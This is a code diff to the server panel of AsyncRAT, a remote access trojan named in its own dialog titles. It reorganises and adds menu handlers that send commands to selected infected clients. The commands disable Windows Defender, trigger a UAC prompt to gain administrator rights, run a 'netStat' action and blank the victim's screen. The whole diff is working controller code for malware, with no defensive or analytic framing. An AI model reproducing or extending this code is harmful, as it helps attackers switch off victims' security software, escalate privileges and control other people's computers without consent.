@@ -800,31 +800,6 @@ namespace Server
             catch { }
         }
 
-        private void DisableWindowsDefenderToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            if (listView1.SelectedItems.Count > 0)
-            {
-                DialogResult dialogResult = MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
-                {
-                    try
-                    {
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Packet").AsString = "defender";
-                        foreach (ListViewItem itm in listView1.SelectedItems)
-                        {
-                            if (itm.SubItems[lv_admin.Index].Text == "Admin")
-                            {
-                                Clients client = (Clients)itm.Tag;
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
-                        }
-                    }
-                    catch { }
-                }
-            }
-        }
-
         private void BotsKillerToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (listView1.SelectedItems.Count > 0)
@@ -859,31 +834,6 @@ namespace Server
                     }
                 }
                 catch { }
-            }
-        }
-
-        private void GetAdminPrivilegesToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            if (listView1.SelectedItems.Count > 0)
-            {
-                DialogResult dialogResult = MessageBox.Show(this, "Popup UAC prompt? ", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
-                if (dialogResult == DialogResult.Yes)
-                {
-                    try
-                    {
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Packet").AsString = "uac";
-                        foreach (ListViewItem itm in listView1.SelectedItems)
-                        {
-                            if (itm.SubItems[lv_admin.Index].Text != "Administrator")
-                            {
-                                Clients client = (Clients)itm.Tag;
-                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
-                            }
-                        }
-                    }
-                    catch { }
-                }
             }
         }
 
@@ -1201,6 +1151,92 @@ namespace Server
             listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
 
             getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText));
+        }
+
+        private void GetAdminPrivilegesToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                DialogResult dialogResult = MessageBox.Show(this, "Popup UAC prompt? ", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                if (dialogResult == DialogResult.Yes)
+                {
+                    try
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "uac";
+                        foreach (ListViewItem itm in listView1.SelectedItems)
+                        {
+                            if (itm.SubItems[lv_admin.Index].Text != "Administrator")
+                            {
+                                Clients client = (Clients)itm.Tag;
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
+                        }
+                    }
+                    catch { }
+                }
+            }
+        }
+
+        private void DisableWindowsDefenderToolStripMenuItem_Click_1(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                DialogResult dialogResult = MessageBox.Show(this, "Will only execute on clients with administrator privileges!", "AsyncRAT | Disbale Defender", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
+                if (dialogResult == DialogResult.Yes)
+                {
+                    try
+                    {
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Packet").AsString = "defender";
+                        foreach (ListViewItem itm in listView1.SelectedItems)
+                        {
+                            if (itm.SubItems[lv_admin.Index].Text == "Admin")
+                            {
+                                Clients client = (Clients)itm.Tag;
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
+                        }
+                    }
+                    catch { }
+                }
+            }
+        }
+
+        private void DisableNetStatToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "netStat";
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        Clients client = (Clients)itm.Tag;
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+                catch { }
+            }
+        }
+
+        private void BlankScreenToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "blankscreen";
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        Clients client = (Clients)itm.Tag;
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                    }
+                }
+                catch { }
+            }
         }
     }
 }
